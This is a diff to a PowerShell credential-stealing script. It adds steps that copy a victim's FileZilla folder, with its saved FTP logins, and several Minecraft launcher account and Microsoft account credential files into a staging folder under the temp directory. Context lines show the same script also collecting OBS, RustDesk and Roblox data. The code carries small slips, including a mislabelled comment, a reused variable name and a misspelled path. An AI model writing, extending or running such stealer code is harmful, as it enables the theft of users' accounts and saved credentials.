@@ -75,6 +75,14 @@ if ($obs -ne $null) {
 	Write-Output $obs >> $env:tmp/$FolderName/ObsData.json
 }
 
+# FileZilla Data
+# RustDesk Config
+$rustdesk = Get-Childitem -Path $env:appdata\FileZilla -Include filezilla.xml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($rustdesk -ne $null) {
+	New-Item -Path $env:tmp/$FolderName/FileZilla -ItemType Directory
+	Copy-Item $env:appdata/FileZilla $env:tmp/$FolderName/FileZilla -Recurse
+}
+
 # RustDesk Config
 $rustdesk = Get-Childitem -Path $env:appdata\RuskDesk\config\ -Include RustDesk.toml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($rustdesk -ne $null) {
@@ -130,7 +138,7 @@ if ($roblox -ne $null) {
 # Get Minecraft Account Details
 function get-MinecraftAccounts {
 	try {
-		$data = Get-Content -Path "$env:appdata/.minecraft/launcher_accounts.json"
+		$data = Get-Content -Path "$env:appdata/.minecraft/launcher_log.txt"
 	}
 	
 	catch {
@@ -144,7 +152,12 @@ function get-MinecraftAccounts {
 
 $minecraft = get-MinecraftAccounts
 if ($minecraft -ne $null) {
-	$minecraft >> $env:tmp/$FolderName/MinecraftAccounts.json
+	New-Item -Path $env:tmp/$FolderName/Minecraft -ItemType Directory
+	Get-Content -Path "$env:appdata/.minecraft/launcher_accounts.json" > $env:tmp/$FolderName/Minecraft/launcher_accounts.json
+	Get-Content -Path "$env:appdata/.minecraft/launcher_accounts_microsoft_store.json" > $env:tmp/$FolderName/Minecraft/launcher_accounts_microsoft_store.json
+	Get-Content -Path "$env:appdata/.minecraft/launcher_msa_credentials.bin" > $env:tmp/$FolderName/Minecraft/launcher_msa_credentials.bin
+	Get-Content -Path "$env:appdata/.minecraft/launcher_msa_credentials_microsoft_store.bin" > $env:tmp/$FolderName/Minecraft/launcher_msa_credentials_microsoft_store.bin
+	Get-Content -Path "$env:appdata/.minecraft/servers.dat" > $env:tmp/$FolderName/Minecraft/servers.dat
 }
 
 ############################################################################################################################################################
